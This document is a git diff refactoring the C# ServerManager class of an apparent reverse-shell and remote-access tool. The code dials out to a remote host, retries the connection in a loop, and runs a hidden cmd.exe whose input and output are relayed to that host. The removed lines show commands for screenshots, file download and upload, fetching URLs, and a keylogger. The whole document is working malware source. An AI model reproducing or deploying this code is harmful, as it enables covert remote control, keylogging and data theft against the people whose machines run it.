@@ -1,7 +1,10 @@
-﻿using System;
+﻿using Commands;
+using NetworkManager;
+using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Net.Sockets;
+using System.Linq;
 using System.Text;
 using System.Threading;
 
@@ -9,16 +12,9 @@ namespace ReverseShellServer
 {
     public class ServerManager
     {
-        TcpClient tcpClient;
-        NetworkStream networkStream;
-        StreamWriter streamWriter;
-        StreamReader streamReader;
-        BinaryWriter binaryWriter;
-        BinaryReader binaryReader;
-        Process processCmd;
-        StringBuilder strInput;
-        
-        ServerTools tools;
+        Process processCmd { get; set; }
+
+        bool terminate { get; set; }
 
 
         public ServerManager()
@@ -34,7 +30,7 @@ namespace ReverseShellServer
 
         public void Start(string remoteAdress, int remotePort, int retryDelay)
         {
-            while (true)
+            while (!terminate)
             {
                 RunServer(remoteAdress, remotePort);
                 Thread.Sleep(retryDelay);           //Wait for a time and try again
@@ -44,50 +40,35 @@ namespace ReverseShellServer
 
         void RunServer(string remoteAdress, int remotePort)
         {
-            tcpClient = new TcpClient();
-            strInput = new StringBuilder();
-            if (!tcpClient.Connected)
+            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
             {
-                try
-                {
-                    tcpClient.Connect(remoteAdress, remotePort);
-
-                    networkStream = tcpClient.GetStream();
-                    streamReader = new StreamReader(networkStream);
-                    streamWriter = new StreamWriter(networkStream);
-                    binaryWriter = new BinaryWriter(networkStream);
-                    binaryReader = new BinaryReader(networkStream);
-                }
-                catch (Exception) { return; } // if no Client, don't continue 
-
-                tools = new ServerTools(binaryWriter, binaryReader, streamWriter);
-
-                processCmd = new Process
-                {
-                    StartInfo =
-                    {
-                        FileName = "cmd.exe",
-                        CreateNoWindow = true,
-                        UseShellExecute = false,
-                        StandardOutputEncoding = Encoding.GetEncoding(850),
-                        RedirectStandardOutput = true,
-                        RedirectStandardInput = true,
-                        RedirectStandardError = true
-                    }
-                };
-                processCmd.OutputDataReceived += CmdOutputDataHandler;
-                processCmd.Start();
-                processCmd.BeginOutputReadLine();
+                return;
             }
 
+            processCmd = new Process
+            {
+                StartInfo =
+                {
+                    FileName = "cmd.exe",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    StandardOutputEncoding = Encoding.GetEncoding(850),
+                    RedirectStandardOutput = true,
+                    RedirectStandardInput = true,
+                    RedirectStandardError = true
+                },
+            };
+            processCmd.OutputDataReceived += CmdOutputDataHandler;
+            processCmd.Start();
+            processCmd.BeginOutputReadLine();
+
+            SayHelloToCmd();
 
             while (true)
             {
                 try
                 {
-                    strInput.Append(streamReader.ReadLine());
-                    ProcessCommand();
-                    strInput.Clear();
+                    ProcessCommand(GlobalNetworkManager.ReadLine());
                 }
                 catch (Exception)
                 {
@@ -98,79 +79,38 @@ namespace ReverseShellServer
         }
 
 
-        void ProcessCommand()
+        void ProcessCommand(string receivedData)
         {
-            var command = strInput.ToString().Split(' ');
-            var bypassHello = false;
-            
-            switch (command[0])
+            var splittedCommand = receivedData.Split(' ').ToList();
+            var commandName = splittedCommand[0];
+            var arguments = new List<string>();
+
+            if (splittedCommand.Count > 1)
             {
-                case "terminate":
-                    StopServer();
-                    break;
-                case "exit":
-                    throw new ArgumentException();
-                case "screenshot":
-                    tools.TakeAndSendScreenShotToClient();
-                    break;
-                case "downloadurl":
-                    tools.DownloadFileFromUrl(command[1]);
-                    break;
-                case "download":
-                    tools.UploadFileToClient(command[1]);
-                    break;
-                case "upload":
-                    tools.ReceiveFileFromClient(command[1]);
-                    break;
-                case "keylogger":
-                    tools.ProcessKeyloggerCommand(command[1]);
-                    break;
-                default:
-                    strInput.Append("\n");
-                    processCmd.StandardInput.WriteLine(strInput);
-                    bypassHello = true;
-                    break;
+                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
             }
 
-            if (!bypassHello)
+            var command = CommandsManager.GetCommandByName(commandName);
+            if (command != null)
             {
+                try
+                {
+                    command.ServerMethod(arguments);
+                }
+                catch (StopServerException)
+                {
+                    StopServer();
+                }
                 SayHelloToCmd();
             }
-        }
-
-
-        void SayHelloToCmd()
-        {
-            strInput.Clear();
-            strInput.Append("Hello !\n");
-            processCmd.StandardInput.WriteLine(strInput);
-        }
-
-
-        void Cleanup()
-        {
-            try
+            else
             {
-                processCmd.Kill();
+                processCmd.StandardInput.WriteLine($"{receivedData}\n");
             }
-            catch (Exception)
-            {
-                // ignored
-            }
-
-            streamReader.Close();
-            streamWriter.Close();
-            binaryReader.Close();
-            binaryWriter.Close();
-            networkStream.Close();
         }
 
 
-        void StopServer()
-        {
-            Cleanup();
-            Environment.Exit(Environment.ExitCode);
-        }
+        void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");
 
 
         /// <summary>
@@ -181,31 +121,50 @@ namespace ReverseShellServer
         void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             var output = outLine.Data;
-            if (!string.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    // Check if the line is the one representing the path
-                    if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
-                    {
-                        // Represents path + > + command
-                        if (output[output.Length - 1] != '>')
-                        {
-                            return;
-                        }
+            if (string.IsNullOrEmpty(outLine.Data)) return;
 
-                        // Change current working directory to the path and return
-                        Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
-                    }
-                    
-                    streamWriter.WriteLine(output);
-                    streamWriter.Flush();
-                }
-                catch (Exception)
+            try
+            {
+                // Check if the line is the one representing the path
+                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
                 {
-                    // ignored
+                    // Represents path + > + command
+                    if (output[output.Length - 1] != '>')
+                    {
+                        return;
+                    }
+
+                    // Change current working directory to the path and return
+                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                 }
+                    
+                GlobalNetworkManager.WriteLine(output);
             }
+            catch (Exception)
+            {
+                // ignored
+            }
+        }
+
+
+        void Cleanup()
+        {
+            try
+            {
+                processCmd.Kill();
+                GlobalNetworkManager.ServerNetworkManager.Cleanup();
+            }
+            catch (Exception)
+            {
+                // ignored
+            }
+        }
+
+
+        void StopServer()
+        {
+            Cleanup();
+            terminate = true;
         }
     }
 }
